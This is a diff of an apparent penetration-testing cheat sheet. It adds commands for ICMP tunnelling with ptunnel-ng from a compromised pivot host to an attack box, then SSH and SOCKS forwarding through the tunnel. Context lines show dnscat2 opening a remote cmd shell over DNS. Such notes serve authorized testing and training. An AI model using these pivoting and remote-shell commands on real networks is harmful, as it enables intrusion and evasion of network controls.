@@ -197,6 +197,25 @@ import-module .<span class="se">\d</span>nscat2.ps1
 start-dnscat2 <span class="nt">-dnsserver</span> &lt;attack box IP&gt; <span class="nt">-domain</span> &lt;domain name&gt; <span class="nt">-presharedsecret</span> &lt;secret shown with dnscat2-server&gt; <span class="nt">-exec</span> cmd
 </code></pre></div>
 
+<h2>ptunnel-ng for pivoting with ICMP</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># that's right, even your pings are not safe from tunneling traffic.</span>
+
+<span class="c"># on pivot / compromised machine, start ptunnel-ng server</span>
+<span class="nb">sudo</span> ./ptunnel-ng <span class="nt">-r</span>&lt;reachable IP through attack box&gt; <span class="nt">-R22</span>
+
+<span class="c"># on attack box, connect to ptunnel-ng server</span>
+<span class="nb">sudo </span>ptunnel-ng <span class="nt">-p</span>&lt;reachable target IP&gt; <span class="nt">-l2222</span> <span class="nt">-r</span>&lt;reachable target IP&gt; <span class="nt">-R22</span>
+
+<span class="c"># connect to SSH over created tunnel</span>
+ssh <span class="nt">-p2222</span> <span class="nt">-l</span>&lt;username&gt; 127.0.0.1
+
+<span class="c"># enable dynamic port forwarding over created tunnel</span>
+ssh <span class="nt">-D</span> 9050 <span class="nt">-p2222</span> <span class="nt">-l</span>&lt;username&gt; 127.0.0.1
+
+<span class="c"># you can then use proxychains as usual.</span>
+</code></pre></div>
+
 <h2>chisel</h2>
 
 <p>for compatibility with powershell-empire, use chisel 1.7.2.</p>
